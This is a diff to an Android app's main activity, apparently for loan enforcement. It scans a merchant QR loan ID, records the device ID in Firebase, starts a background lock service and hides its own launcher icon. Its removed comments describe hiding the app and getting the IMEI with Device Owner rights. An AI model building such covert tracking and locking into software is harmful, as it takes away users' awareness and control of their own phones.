@@ -2,9 +2,7 @@ package com.harshit.client
 
 import android.Manifest
 import android.annotation.SuppressLint
-import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
-import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.os.Build
@@ -34,7 +32,6 @@ class MainActivity : AppCompatActivity() {
         barcodeScanner = findViewById(R.id.barcode_scanner)
         tvStatus = findViewById(R.id.tvStatus)
 
-        // 1. कैमरा परमिशन चेक करो
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
             ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA, Manifest.permission.READ_PHONE_STATE), CAMERA_PERMISSION_CODE)
         } else {
@@ -49,9 +46,8 @@ class MainActivity : AppCompatActivity() {
         barcodeScanner.decodeContinuous(object : BarcodeCallback {
             override fun barcodeResult(result: BarcodeResult?) {
                 result?.let {
-                    val scannedData = it.text // मर्चेंट के QR से मिला डेटा (जैसे Loan ID)
-                    barcodeScanner.pause() // एक बार स्कैन होने के बाद स्कैनर रोक दो
-                    
+                    val scannedData = it.text
+                    barcodeScanner.pause()
                     tvStatus.text = "Syncing with Merchant..."
                     syncWithFirebase(scannedData)
                 }
@@ -62,19 +58,15 @@ class MainActivity : AppCompatActivity() {
 
     @SuppressLint("HardwareIds")
     private fun syncWithFirebase(scannedData: String) {
-        // फोन का असली ID/IMEI निकालना
-        var deviceIMEI = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+        val deviceIMEI = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
         
-        // (अगर Device Owner है, तो असली IMEI भी निकल सकता है, अभी सुरक्षित तरीके से Android ID ले रहे हैं)
-        
-        // फायरबेस में डेटा भेजना (मर्चेंट को सिग्नल देना कि डिवाइस जुड़ गया है)
         databaseRef.child(deviceIMEI).child("isDeviceLocked").setValue(false)
         databaseRef.child(deviceIMEI).child("status").setValue("Active / Synced")
-        databaseRef.child(deviceIMEI).child("loanId").setValue(scannedData) // QR से मिली Loan ID
+        databaseRef.child(deviceIMEI).child("loanId").setValue(scannedData)
+        databaseRef.child(deviceIMEI).child("imei").setValue(deviceIMEI)
 
         Toast.makeText(this, "Device Synced Successfully!", Toast.LENGTH_LONG).show()
 
-        // बैकग्राउंड सर्विस स्टार्ट करो
         val serviceIntent = Intent(this, LockService::class.java)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(serviceIntent)
@@ -82,7 +74,6 @@ class MainActivity : AppCompatActivity() {
             startService(serviceIntent)
         }
 
-        // अपना काम होने के बाद ऐप का आइकॉन फोन के मेन्यू से छुपा दो (Hide App)
         hideAppIcon()
     }
 
@@ -93,7 +84,7 @@ class MainActivity : AppCompatActivity() {
             PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
             PackageManager.DONT_KILL_APP
         )
-        finish() // ऐप स्क्रीन से बंद हो जाएगा लेकिन बैकग्राउंड में चलता रहेगा
+        finish()
     }
 
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
@@ -101,7 +92,7 @@ class MainActivity : AppCompatActivity() {
         if (requestCode == CAMERA_PERMISSION_CODE && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
             startScanner()
         } else {
-            Toast.makeText(this, "Camera Permission is required to scan QR!", Toast.LENGTH_SHORT).show()
+            Toast.makeText(this, "Camera Permission is required!", Toast.LENGTH_SHORT).show()
         }
     }
 
